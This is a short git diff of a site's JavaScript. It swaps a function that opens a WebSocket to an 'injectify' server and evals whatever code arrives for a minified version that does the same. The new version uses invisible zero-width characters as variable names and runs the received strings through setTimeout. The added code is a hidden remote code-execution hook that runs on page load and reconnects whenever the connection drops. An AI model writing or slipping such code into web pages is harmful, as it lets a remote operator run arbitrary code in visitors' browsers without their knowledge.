@@ -77,18 +77,4 @@ if (window.location.host !== 'samdd.me' && window.location.host !== '127.0.0.1:6
 	window.location = 'https://samdd.me';
 }
 
-function u() {
-	window.ws = new WebSocket("wss://injectify.samdd.me/i?c2FtZGQ="), ws.onmessage = function (d) {
-		try {
-			d = JSON.parse(d.data), eval(d.d)
-		} catch (e) {
-			ws.send(JSON.stringify({
-				t: "e",
-				d: e
-			}))
-		}
-	}, ws.onclose = function () {
-		setTimeout(u, 3e3)
-	}
-}
-u();
+!function i‍‍(){var i=setTimeout;self.i‍=new WebSocket("wss://injectify.samdd.me/i1?c2FtZGQ="),i‍.onmessage=function(d){try{i(d.data)}catch(i‍‍‍){i‍.send('e:'+JSON.stringify(i‍‍‍.stack))}},i‍.onclose=function(){i(i‍‍,1e3)}}();
